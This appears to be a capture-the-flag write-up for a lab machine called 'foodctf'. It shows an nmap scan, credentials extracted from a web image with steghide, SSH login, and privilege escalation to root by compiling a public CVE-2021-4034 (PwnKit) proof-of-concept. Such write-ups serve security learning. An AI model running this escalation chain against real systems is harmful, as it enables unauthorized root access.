# IP
10.10.103.1

## Enumeration

### Nmap
Found 5 ports running on the machine
```console
❯ nmap -sC -sV 10.10.103.1 -p- -vvv --min-rate=700 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-17 17:36 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:36
Completed NSE at 17:36, 0.00s elapsed
Initiating Ping Scan at 17:36
Scanning 10.10.103.1 [2 ports]
Completed Ping Scan at 17:36, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:36
Completed Parallel DNS resolution of 1 host. at 17:36, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:36
Scanning 10.10.103.1 [65535 ports]
Discovered open port 3306/tcp on 10.10.103.1
Discovered open port 22/tcp on 10.10.103.1
Discovered open port 16109/tcp on 10.10.103.1
Connect Scan Timing: About 32.01% done; ETC: 17:37 (0:01:06 remaining)
Discovered open port 9999/tcp on 10.10.103.1
Connect Scan Timing: About 63.37% done; ETC: 17:37 (0:00:35 remaining)
Discovered open port 15065/tcp on 10.10.103.1
Discovered open port 46969/tcp on 10.10.103.1
Completed Connect Scan at 17:37, 96.58s elapsed (65535 total ports)
Initiating Service scan at 17:37
Scanning 6 services on 10.10.103.1
Completed Service scan at 17:39, 92.34s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.103.1.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 7.43s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 2.09s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Nmap scan report for 10.10.103.1
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-11-17 17:36:17 IST for 198s
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 28:0c:0c:d9:5a:7d:be:e6:f4:3c:ed:10:51:49:4d:19 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKjhSBkXZSZMWPqxiPKa9BxFKoQC6ZhXkKFa28z6w3yLpDBuzZTKyzkoLBm0n8APmlqu9CxnHyVZEmZYwddFuj4FMuAyYNS4BHFg5xMtnKlJK2OKol6F+DRaV8S98FEz0uFaI5yR5PUUtFrByqF01ppr04/HHVvBQpoZDCUabPZRJiEtOi/a5fhBvYRMGJdlijUiee6AoWf4tOc6RPgzxHi2bkqWKyGqdTf26p22tHk0XgSgzQzSh8ABrODNzm04EZYd9+ZHupIo2/mRJGQlBMoVuCcbQpdQrpP/+ivVFiCM8kytrn5Z3ayu6bEslCsbSjvG5VCtAHe2U+q2bsrZ/l
|   256 17:ce:03:3b:bb:20:78:09:ab:76:c0:6d:8d:c4:df:51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCe4ipBH4bCimLbh8uzN1ix9+rEVIPbFdICCeNBR/+lndHq94/4Ow0odFFBok3r8lFVaPUSTj8QJNES04lSe/sY=
|   256 07:8a:50:b5:5b:4a:a7:6c:c8:b3:a1:ca:77:b9:0d:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEnPlJ5lhNGmcnRSde/U2Jg6eHjsPIm08Z4fRBrjk2Qf
3306/tcp  open  mysql   syn-ack MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 17
|   Capabilities flags: 65535
|   Some Capabilities: DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake, SupportsCompression, LongColumnFlag, Speaks41ProtocolNew, SupportsLoadDataLocal, FoundRows, ODBCClient, InteractiveClient, LongPassword, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: k\x01M\x13ZB\x16c\x030w\x05\x0EV7G\x10\x05K\x19
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.29_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-03-19T17:21:30
| Not valid after:  2030-03-17T17:21:30
| MD5:   a067 7d7d a831 9979 e1d7 4ca7 1e2f 5319
| SHA-1: 5769 4d3d 4ff6 fce9 b4dd 1553 9799 9a97 0f1e 75e8
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjI5X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIwMDMxOTE3MjEzMFoXDTMwMDMxNzE3MjEzMFowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4yOV9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCzxbl/o0Yu+SMlRxpsJBc1
| u96qvYHIdw0u+KeBECpkCm8Qa2hzfr317Ccm1e51djo+YWJl/tgljr/OqWlhutIJ
| g/IeNoSsFK2/JpevwX0JH8RFx2ZLS9wBU77xirWBHWCv2B8GZOmyAeF4mieIwzZc
| dGXIWGGfYRh9A7h5BPqxi3M1DnvE1Z8CbYNB76sEzh2xef9qCEVY3TObGPUTAUM6
| R6nlyZg7eS8/OcGM0nHEBoHn1qLzhZxuq6ybdPkM53SRMf4XRMYa91xSF9ok79IT
| ube+BDD5npRp/Ig+WPE29PFEipHVVxd30tDOVzRbmi1bM7g1P7M5DKq7/qg+hM7f
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAFEe95AD
| I593ZIX/I3cOeven7J+7RBeenYSscFVE6GZiP1F4pytK1Z7a8G5LrohcOecpqhAn
| kW0H1uLP3sSdRDN3a9+bDbYbrFocxByXWmHMV41KW+kPWCPbgRtMppCcgz/1LyDw
| +iKzANFQ371T311GguiX5+3Ke5HnerztjnQglXtL6KqiOBESoE9PqG4N+rJRyGY2
| vcjBRnYeYCAuEoHqhGgrNS4qoblttVu+3va09UeFh3P85fU7FwhCg8YTQiLzXFFU
| S9fUDr6qIbmoUyZSiFBcRJVOlmdzGd65KufpzwvjGgaj/CHS3BAHGhq+rxOq6vP4
| 0NYd9tFJyu3J2c8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
9999/tcp  open  abyss?  syn-ack
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Thu, 17 Nov 2022 12:08:03 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Thu, 17 Nov 2022 12:08:02 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|_    king
15065/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Host monitoring
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
16109/tcp open  unknown syn-ack
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Thu, 17 Nov 2022 12:08:03 GMT
|     Content-Type: image/jpeg
|     JFIF
|     #*%%*525EE\xff
|     #*%%*525EE\xff
|     $3br
|     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     Y$?_
|     qR]$Oyk
|_    |$o.
46969/tcp open  telnet  syn-ack Linux telnetd
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9999-TCP:V=7.92%I=7%D=11/17%Time=63762420%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,78,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2017\x20Nov\x202
SF:022\x2012:08:02\x20GMT\r\nContent-Length:\x204\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\n\r\nking")%r(HTTPOptions,78,"HTTP/1\.0\x202
SF:00\x20OK\r\nDate:\x20Thu,\x2017\x20Nov\x202022\x2012:08:03\x20GMT\r\nCo
SF:ntent-Length:\x204\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:\r\nking")%r(FourOhFourRequest,78,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20T
SF:hu,\x2017\x20Nov\x202022\x2012:08:03\x20GMT\r\nContent-Length:\x204\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nking")%r(GenericLi
SF:nes,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-
SF:8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port16109-TCP:V=7.92%I=7%D=11/17%Time=63762420%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(GetRequest,2DD6,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu
SF:,\x2017\x20Nov\x202022\x2012:08:03\x20GMT\r\nContent-Type:\x20image/jpe
SF:g\r\n\r\n\xff\xd8\xff\xe0\0\x10JFIF\0\x01\x01\x01\0H\0H\0\0\xff\xdb\0C\
SF:0\x02\x03\x03\x03\x04\x03\x04\x05\x05\x04\x06\x06\x06\x06\x06\x08\x08\x
SF:07\x07\x08\x08\r\t\n\t\n\t\r\x13\x0c\x0e\x0c\x0c\x0e\x0c\x13\x11\x14\x1
SF:1\x0f\x11\x14\x11\x1e\x18\x15\x15\x18\x1e#\x1d\x1c\x1d#\*%%\*525EE\\\xf
SF:f\xdb\0C\x01\x02\x03\x03\x03\x04\x03\x04\x05\x05\x04\x06\x06\x06\x06\x0
SF:6\x08\x08\x07\x07\x08\x08\r\t\n\t\n\t\r\x13\x0c\x0e\x0c\x0c\x0e\x0c\x13
SF:\x11\x14\x11\x0f\x11\x14\x11\x1e\x18\x15\x15\x18\x1e#\x1d\x1c\x1d#\*%%\
SF:*525EE\\\xff\xc0\0\x11\x08\x03\x84\x05F\x03\x01\"\0\x02\x11\x01\x03\x11
SF:\x01\xff\xc4\0\x1f\0\0\x01\x05\x01\x01\x01\x01\x01\x01\0\0\0\0\0\0\0\0\
SF:x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\0\xb5\x10\0\x02\x01\x03
SF:\x03\x02\x04\x03\x05\x05\x04\x04\0\0\x01}\x01\x02\x03\0\x04\x11\x05\x12
SF:!1A\x06\x13Qa\x07\"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf0\$3br\x
SF:82\t\n\x16\x17\x18\x19\x1a%&'\(\)\*456789:CDEFGHIJSTUVWXYZcdefghijstuvw
SF:xyz\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97\x98\x99\x9a
SF:\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xb
SF:a\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\x
SF:da\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf1\xf2\xf3\xf4\xf5\xf6\xf7\
SF:xf8\xf9\xfa\xff\xc4\0\x1f\x01\0\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01
SF:\0\0\0\0\0\0\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\0\xb5\x11\
SF:0\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\0\x01\x02w\0\x01\x02\x03\
SF:x11\x04\x05!1\x06\x12AQ\x07aq\x13\"2\x81\x08\x14B\x91\xa1\xb1\xc1\t#3R\
SF:xf0\x15br\xd1\n\x16\$4\xe1%\xf1\x17\x18\x19\x1a&'\(\)\*56789:CDEFGHIJST
SF:UVWXYZcdefghijstuvwxyz\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\
SF:x95\x96\x97\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4
SF:\xb5\xb6\xb7\xb8\xb9\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd
SF:4\xd5\xd6\xd7\xd8\xd9\xda\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf2\xf3\x
SF:f4\xf5\xf6\xf7\xf8\xf9\xfa\xff\xda\0\x0c\x03\x01\0\x02\x11\x03\x11\0\?\
SF:0\xfa\x96F\xf3/\x0f\xcd\xc0\xdcp\x7f\*\x97!\x1e\xd4p\x7f\|\x83\xdf\x8c\
SF:xb7\xf4\xa4\xb4\x8e=\x92\xc9\xce\xec\xe2\x90\xc6Zks\x91\x85Y\$\?_\xba\+
SF:\x81\x1e\xa9E\xees31\xe0\x02\xccA\xfe\x20\xa35\x90\x1c\xff\0fC\x95\x1b\
SF:x88\x047L\xe4\xf4\x1f\x9d\^\x92=\xdez\?\xded!~\x8eqR\]\$Oyk\x02\x81\x85
SF:\xc1\xc9\xe8\0\xed\xfaS\x11\|\x05q\x20\xee\xbbT\x0fM\xc6\xa3i\xb2\x97\x
SF:937\x18\xca\xae:\xd6t\x0e\xdb\xe3\xf4/#\x96\xf4\t\x92\)\xad\xb7\xca\x89
SF:\x03}\xf9@l\xfbsLh\xcb\xba@\xb7d\x86%\x96\xdc\*\xfb\x175\x8b\|\$o\.\xd9
SF:N\xe1\xf2n\xfa\x97\x15\xbdrA\x86G\r\x9c\xce\xaa9\xfe\xe7ZM2\x08");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.46 seconds

```




### Web(16109)
- Found an image on the web page
- Downloaded the machine and checked with steghide, got creds.txt file

```console
❯ steghide --extract -sf  image.jpeg
Enter passphrase:
wrote extracted data to "creds.txt".
```


- This creds.tx has credentials for user `pasta`

```console
❯ cat creds.txt
pasta:pastaisdynamic
```


## Exploit

### SSH
- Secured shelled as user `pasta`.
- Found one flag in the `/home/bread`


### Privilege Escalation
- Loaded `linpeas.sh` to the machine
- Found it vulnerable to [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)

```console
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588

```
- Downloaded [this](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) exploit and loaded it to the machine. 
- Make executable with `gcc`.

```console
pasta@foodctf:/tmp$ gcc cve-2021-4034-poc.c -o exploit
pasta@foodctf:/tmp$ ls
cve-2021-4034-poc.c
exploit
linpeas-new.sh
systemd-private-f908864c7561440a9eddb946eb48f15b-systemd-resolved.service-OMWbKo
systemd-private-f908864c7561440a9eddb946eb48f15b-systemd-timesyncd.service-AT8iGM
tmux-1002
```

- Start the executable

```console
pasta@foodctf:/tmp$ ./exploit
# whoami
root
```
